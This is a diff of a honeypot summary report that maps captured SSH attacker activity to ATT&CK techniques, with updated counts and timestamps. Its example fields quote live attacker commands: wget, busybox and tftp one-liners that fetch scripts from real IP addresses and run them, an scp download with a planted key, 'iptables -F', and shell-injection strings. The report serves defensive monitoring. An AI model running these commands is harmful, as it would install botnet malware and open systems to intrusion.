@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-15 22:02:46",
+  "generated": "2026-09-15 23:00:46",
   "totals": {
-    "commands": 4198,
-    "login_failed": 6387,
-    "login_success": 1281,
-    "sessions": 6312
+    "commands": 6275,
+    "login_failed": 7084,
+    "login_success": 1956,
+    "sessions": 7063
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 6387,
+      "count": 7084,
       "examples": [
         "root / 12345678",
         "root / 123456789",
@@ -21,14 +21,14 @@
         "root / vizxv"
       ],
       "first": "2026-09-15T00:01:09.372940Z",
-      "last": "2026-09-15T21:59:56.355109Z",
-      "unique_ips": 99
+      "last": "2026-09-15T22:59:30.469216Z",
+      "unique_ips": 107
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1281,
+      "count": 1956,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / 123456",
@@ -37,14 +37,14 @@
         "root / root123"
       ],
       "first": "2026-09-15T00:08:25.379657Z",
-      "last": "2026-09-15T21:52:02.153371Z",
-      "unique_ips": 74
+      "last": "2026-09-15T22:55:16.253335Z",
+      "unique_ips": 81
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 1168,
+      "count": 1833,
       "examples": [
         "ls /home; /bin/busybox BOTNET",
         "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   ",
@@ -52,14 +52,14 @@
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-09-15T01:59:58.939321Z",
-      "last": "2026-09-15T21:11:52.971647Z",
+      "last": "2026-09-15T22:27:31.372296Z",
       "unique_ips": 6
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 144,
+      "count": 160,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -68,14 +68,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-09-15T01:24:06.981771Z",
-      "last": "2026-09-15T21:52:02.461330Z",
-      "unique_ips": 15
+      "last": "2026-09-15T22:56:12.530685Z",
+      "unique_ips": 17
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 81,
+      "count": 96,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
@@ -84,8 +84,8 @@
         "wget http://102.220.160.204/wget.sh -O- | sh;tftp -g102.220.160.204 -r tftp.sh -l- | sh;/bin/busybox wget http://102.220"
       ],
       "first": "2026-09-15T01:24:06.981771Z",
-      "last": "2026-09-15T21:52:02.461330Z",
-      "unique_ips": 16
+      "last": "2026-09-15T22:56:12.530685Z",
+      "unique_ips": 19
     },
     {
       "id": "T1489",
@@ -117,7 +117,7 @@
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 21,
+      "count": 22,
       "examples": [
         "uname -s -m",
         "uname -s -v -n -r -m",
@@ -126,22 +126,22 @@
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-15T00:47:30.338036Z",
-      "last": "2026-09-15T21:32:26.995342Z",
-      "unique_ips": 17
+      "last": "2026-09-15T22:33:35.769677Z",
+      "unique_ips": 18
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 13,
+      "count": 15,
       "examples": [
         "id",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-15T01:24:06.195363Z",
-      "last": "2026-09-15T21:52:02.168244Z",
-      "unique_ips": 13
+      "last": "2026-09-15T22:55:20.949125Z",
+      "unique_ips": 15
     },
     {
       "id": "T1070.004",
@@ -173,13 +173,13 @@
       "id": "T1087.001",
       "name": "Account Discovery: Local Account",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 3,
       "examples": [
         "cat /etc/passwd"
       ],
       "first": "2026-09-15T01:24:06.200357Z",
-      "last": "2026-09-15T21:52:02.172882Z",
-      "unique_ips": 2
+      "last": "2026-09-15T22:41:02.923670Z",
+      "unique_ips": 3
     },
     {
       "id": "T1037",
@@ -204,36 +204,48 @@
       "first": "2026-09-15T15:19:43.256044Z",
       "last": "2026-09-15T15:19:43.256044Z",
       "unique_ips": 1
+    },
+    {
+      "id": "T1562.004",
+      "name": "Impair Defenses: Disable or Modify System Firewall",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "iptables -F"
+      ],
+      "first": "2026-09-15T22:34:58.850039Z",
+      "last": "2026-09-15T22:34:58.850039Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "system",
-      1204
+      1875
     ],
     [
       "sh",
-      1201
+      1872
     ],
     [
       "shell",
-      69
+      75
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      48
+      56
     ],
     [
       "/bin/busybox UNSTABLE",
-      38
+      41
     ],
     [
       "/bin/busybox",
-      36
+      39
     ],
     [
       "enable",
-      34
+      37
     ],
     [
       "sh 0",
@@ -241,6 +253,10 @@
     ],
     [
       "linuxshell",
+      15
+    ],
+    [
+      "cd /proc && cat self/cmdline",
       13
     ],
     [
@@ -248,8 +264,12 @@
       13
     ],
     [
-      "cd /proc && cat self/cmdline",
-      12
+      "ping ;sh",
+      11
+    ],
+    [
+      "enablelinuxshell",
+      10
     ],
     [
       "zalee",
@@ -264,27 +284,19 @@
       10
     ],
     [
-      "enablelinuxshell",
-      9
-    ],
-    [
-      "ping ;sh",
-      9
-    ],
-    [
       "!v54!",
       6
     ],
     [
-      "ping; sh",
+      "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
       3
     ],
     [
-      "Ruckus",
+      "bash",
       3
     ],
     [
-      "\";/bin/sh;\"",
+      "cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----",
       3
     ]
   ]
